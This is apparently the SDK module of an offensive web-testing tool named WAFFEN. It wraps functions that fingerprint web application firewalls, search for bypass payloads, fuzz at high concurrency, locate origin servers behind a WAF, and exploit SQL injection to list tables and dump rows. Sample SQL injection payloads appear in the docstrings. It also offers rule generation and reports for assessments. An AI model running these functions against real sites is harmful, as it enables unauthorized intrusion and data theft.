"""WAFFEN SDK — use WAFFEN as a Python library.

Quick start::

    from waffen.sdk import bypass, fingerprint, discover, exploit, fuzz

    # Bypass search
    result = bypass("https://target.com", path="/search", param="q")
    for f in result.findings:
        print(f.payload, f.verified)

    # Fingerprint WAF
    waf = fingerprint("https://target.com")
    print(waf.name, waf.confidence)

    # Discover injection points
    points = discover("https://target.com", path="/search")
    print(points.best)

    # Exploit through a bypass
    data = exploit("https://target.com", path="/search", param="q",
                   bypass_payload="' GLOB '*", tables=True)
    print(data.tables)

    # High-speed fuzz
    result = fuzz("https://target.com", path="/search", param="q",
                  builtin="sqli", concurrency=50)
    print(f"{result.passed} passed, {result.rps:.0f} req/s")

Every function accepts ``**kwargs`` forwarded to the underlying ``Target``
(e.g. ``cookie="sid=abc"``, ``extra_headers=("Authorization: Bearer ...",)``).
"""
from __future__ import annotations

from dataclasses import dataclass, field
from typing import Optional, Sequence

from .core.oracle import Target
from .kb.seeds import seeds_for, resolve_class


# ---------------------------------------------------------------------------
# Result dataclasses — clean, stable public API
# ---------------------------------------------------------------------------

@dataclass
class BypassFinding:
    """One WAF bypass found during search."""
    payload: str
    chain: list[str]
    code: str
    attack_class: str = ""
    verified: bool | None = None
    confidence: float | None = None


@dataclass
class BypassResult:
    """Result of a bypass search."""
    findings: list[BypassFinding] = field(default_factory=list)
    total_requests: int = 0
    verified_count: int = 0
    strategy: str = ""

    def has_bypass(self) -> bool:
        return self.verified_count > 0


@dataclass
class FingerprintResult:
    """Result of WAF fingerprinting."""
    name: str = "Unknown"
    confidence: float = 0.0
    evidence: str = ""
    all_matches: list = field(default_factory=list)


@dataclass
class DiscoverResult:
    """Result of injection-point discovery."""
    injection_points: list = field(default_factory=list)
    best_point: dict | None = None
    requests_used: int = 0


@dataclass
class ExploitResult:
    """Result of SQLi exploitation."""
    success: bool = False
    dbms: str = ""
    technique: str = ""
    tables: list[str] = field(default_factory=list)
    data: list[dict] = field(default_factory=list)
    columns: list[str] = field(default_factory=list)
    requests_used: int = 0
    error: str = ""


@dataclass
class FuzzMatchResult:
    """One fuzz probe result."""
    payload: str = ""
    code: int = 0
    size: int = 0
    time_ms: float = 0.0
    is_blocked: bool = False


@dataclass
class FuzzResult:
    """Result of high-speed fuzzing."""
    total: int = 0
    passed: int = 0
    blocked: int = 0
    errors: int = 0
    results: list[FuzzMatchResult] = field(default_factory=list)
    rps: float = 0.0


@dataclass
class ScoreProbeResult:
    """Result of scoring engine threshold probing."""
    detected_keywords: list[str] = field(default_factory=list)
    invisible_keywords: list[str] = field(default_factory=list)
    boundary_payloads: list[str] = field(default_factory=list)
    flip_index: int = -1
    requests_used: int = 0


@dataclass
class OriginResult:
    """Result of origin IP discovery."""
    candidates: list[dict] = field(default_factory=list)
    verified: list[dict] = field(default_factory=list)


# ---------------------------------------------------------------------------
# Target builder — shared by all SDK functions
# ---------------------------------------------------------------------------

def _build_target(url: str, path: str = "/", param: str = "q",
                  method: str = "GET", inject: str = "query",
                  block_signature: str = "", transport: str = "auto",
                  timeout: int = 15, tls_verify: bool = False,
                  cookie: str = "", extra_headers: tuple = (),
                  **_ignored) -> Target:
    return Target(
        base_url=url, path=path, param=param, method=method,
        inject=inject, block_signature=block_signature,
        timeout=timeout, tls_verify=tls_verify,
        cookie=cookie, extra_headers=extra_headers,
    )


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

def bypass(url: str, path: str = "/", param: str = "q",
           attack_class: str = "sqli", strategy: str = "beam",
           max_requests: int = 400, calibrate: bool = True,
           verify: bool = True, exploit_guided: bool = True,
           corpus: bool = False, transport: str = "auto",
           **kwargs) -> BypassResult:
    """Run a WAF bypass search.

    >>> result = bypass("https://target.com", path="/search", attack_class="sqli")
    >>> result.has_bypass()
    False
    """
    from .engine import run_bypass

    target = _build_target(url, path, param, transport=transport, **kwargs)
    cls = resolve_class(attack_class)
    seed_payloads = seeds_for(cls, include_corpus=corpus)
    seed_list = [(cls, p) for p in seed_payloads]

    runs = run_bypass(
        target, seed_list,
        strategy=strategy, max_requests=max_requests,
        do_calibrate=calibrate, do_verify=verify,
        exploit_guided=exploit_guided,
        transport=transport,
    )

    findings = []
    total_req = 0
    for run in runs:
        total_req += run.result.requests
        for f in run.result.findings:
            findings.append(BypassFinding(
                payload=f.payload, chain=f.chain, code=f.code,
                attack_class=f.attack_class, verified=f.verified,
                confidence=f.confidence,
            ))

    verified = sum(1 for f in findings if f.verified)
    return BypassResult(
        findings=findings, total_requests=total_req,
        verified_count=verified, strategy=strategy,
    )


def fingerprint(url: str, path: str = "/", **kwargs) -> FingerprintResult:
    """Identify the WAF in front of a target.

    >>> waf = fingerprint("https://target.com")
    >>> waf.name
    'Unknown'
    """
    from .recon.fingerprint import fingerprint as _fp

    target = _build_target(url, path, **kwargs)
    guesses = _fp(target)
    if not guesses:
        return FingerprintResult()

    top = guesses[0]
    return FingerprintResult(
        name=getattr(top, "name", "Unknown"),
        confidence=getattr(top, "confidence", 0.0),
        evidence=getattr(top, "evidence", ""),
        all_matches=[
            {"name": getattr(g, "name", "?"),
             "confidence": getattr(g, "confidence", 0.0),
             "evidence": getattr(g, "evidence", "")}
            for g in guesses
        ],
    )


def discover(url: str, path: str = "/", **kwargs) -> DiscoverResult:
    """Find WAF-inspected injection points on a target.

    >>> result = discover("https://target.com", path="/search")
    >>> len(result.injection_points)
    0
    """
    from .recon.discover import InjectionDiscovery

    target = _build_target(url, path, **kwargs)
    disc = InjectionDiscovery(target)
    report = disc.discover()

    best = None
    if report.best:
        p = report.best
        best = {"location": p.location, "param": p.param,
                "waf_active": p.waf_active}

    return DiscoverResult(
        injection_points=[
            {"location": p.location, "param": p.param,
             "waf_active": p.waf_active, "baseline_code": p.baseline_code,
             "blocked_code": p.blocked_code, "confidence": p.confidence}
            for p in report.points
        ],
        best_point=best,
        requests_used=report.requests_used,
    )


def exploit(url: str, path: str = "/", param: str = "q",
            bypass_payload: str = "", bypass_chain: list[str] | None = None,
            tables: bool = False, table: str = "", dump: bool = False,
            columns: bool = False, limit: int = 10,
            transport: str = "auto", **kwargs) -> ExploitResult:
    """Exploit a SQL injection through a WAF bypass path.

    >>> data = exploit("https://target.com", bypass_payload="' GLOB '*", tables=True)
    >>> data.success
    False
    """
    from .exploit.sqli import SQLiExploiter

    target = _build_target(url, path, param, transport=transport, **kwargs)
    exp = SQLiExploiter(target, bypass_payload,
                        bypass_chain=bypass_chain or [],
                        transport=transport)

    result = ExploitResult()
    try:
        result.dbms = exp.detect_dbms()
        result.technique = exp.detect_technique()

        if tables or (not table and not dump):
            result.tables = exp.enumerate_tables()
            result.success = bool(result.tables)

        if columns and table:
            result.columns = exp.enumerate_columns(table)
            result.success = result.success or bool(result.columns)

        if dump and table:
            ext = exp.extract(table, limit=limit)
            result.data = ext.data
            result.columns = ext.columns
            result.success = result.success or bool(ext.data)

        result.requests_used = exp._requests
    except Exception as exc:
        result.error = str(exc)

    return result


def fuzz(url: str, path: str = "/", param: str = "q",
         wordlist: list[str] | None = None, builtin: str = "",
         attack_class: str = "", concurrency: int = 50,
         transport: str = "auto", **kwargs) -> FuzzResult:
    """High-speed wordlist fuzzing against a WAF.

    >>> result = fuzz("https://target.com", builtin="sqli")
    >>> result.total >= 0
    True
    """
    from .fuzz.engine import AsyncFuzzer
    from .fuzz.wordlists import BUILTINS

    target = _build_target(url, path, param, transport=transport, **kwargs)
    block_sig = kwargs.get("block_signature", "")

    words: list[str] = []
    if wordlist:
        words = list(wordlist)
    elif builtin and builtin in BUILTINS:
        words = BUILTINS[builtin]()
    elif attack_class:
        from .kb.corpus import corpus_for
        words = corpus_for(attack_class)

    if not words:
        return FuzzResult()

    fuzzer = AsyncFuzzer(target, concurrency=concurrency,
                         block_signature=block_sig)
    report = fuzzer.fuzz_wordlist(words)

    return FuzzResult(
        total=report.total, passed=report.passed,
        blocked=report.blocked, errors=report.errors,
        results=[
            FuzzMatchResult(payload=r.payload, code=r.code, size=r.size,
                            time_ms=r.time_ms, is_blocked=r.is_blocked)
            for r in report.results
        ],
        rps=report.rps,
    )


def score_probe(url: str, path: str = "/", param: str = "q",
                attack_class: str = "sqli",
                transport: str = "auto", **kwargs) -> ScoreProbeResult:
    """Map WAF scoring-engine detection thresholds.

    >>> result = score_probe("https://target.com")
    >>> isinstance(result.detected_keywords, list)
    True
    """
    from .recon.score_probe import ScoreProber
    from .core.oracle import Oracle

    target = _build_target(url, path, param, transport=transport, **kwargs)
    oracle = Oracle(target, transport=transport)
    prober = ScoreProber(oracle)
    raw = prober.run(attack_class)

    detected = [k.token for k in raw.keyword_map if k.detected]
    invisible = [k.token for k in raw.keyword_map if not k.detected]
    boundary = [b.payload for b in raw.boundary_payloads if b.verdict == "THROUGH"]

    return ScoreProbeResult(
        detected_keywords=detected, invisible_keywords=invisible,
        boundary_payloads=boundary, flip_index=raw.flip_index,
        requests_used=raw.requests_used,
    )


def origin(domain: str, verify: bool = False, **kwargs) -> OriginResult:
    """Find the origin server IP behind a WAF.

    >>> result = origin("example.com")
    >>> isinstance(result.candidates, list)
    True
    """
    from .recon.origin import OriginDiscovery

    disc = OriginDiscovery(domain)
    if verify:
        report = disc.discover_and_verify()
    else:
        report = disc.discover()

    candidates = [
        {"ip": c.ip, "source": c.source, "confidence": c.confidence,
         "evidence": c.evidence}
        for c in report.candidates
    ]

    verified_list = [
        {"ip": c.ip, "source": c.source}
        for c in report.candidates
        if getattr(c, "verified", False)
    ]

    return OriginResult(candidates=candidates, verified=verified_list)


def defend(findings: list[dict] | list, engine: str = "modsecurity") -> str:
    """Generate deployable WAF rules from bypass findings.

    >>> rules = defend([{"payload": "' OR 1=1--", "chain": ["base64"]}])
    >>> "SecRule" in rules or len(rules) >= 0
    True
    """
    from .report.defend import generate_rules, render_rules

    rules = generate_rules(findings, engine=engine)
    return render_rules(rules, engine=engine)


def report(findings: list[dict] | list, format: str = "html",
           title: str = "WAF Bypass Assessment", **kwargs) -> str:
    """Generate a report from findings.

    Args:
        findings: List of finding dicts (from bypass().findings or JSONL)
        format: "html", "csv", "sarif", "nuclei"
        title: Report title

    Returns:
        Report content as a string (HTML, CSV text, etc.)
    """
    if format == "html":
        from .report.professional import generate_html_report, ReportConfig
        config = ReportConfig(title=title, **{k: v for k, v in kwargs.items()
                                               if k in ("author", "classification", "target", "date")})
        return generate_html_report(findings, config)
    elif format == "csv":
        import io
        import csv
        output = io.StringIO()
        fieldnames = ["attack_class", "payload", "chain", "code", "verified"]
        writer = csv.DictWriter(output, fieldnames=fieldnames)
        writer.writeheader()
        for f in findings:
            if isinstance(f, dict):
                row = f
            else:
                row = f.as_dict() if hasattr(f, "as_dict") else {"payload": str(f)}
            writer.writerow({k: row.get(k, "") for k in fieldnames})
        return output.getvalue()
    elif format == "sarif":
        from .report.sarif import findings_to_sarif
        import json
        target = kwargs.get("target", "")
        return json.dumps(findings_to_sarif(findings, target), indent=2)
    else:
        raise ValueError(f"Unknown report format: {format!r}. Use: html, csv, sarif")
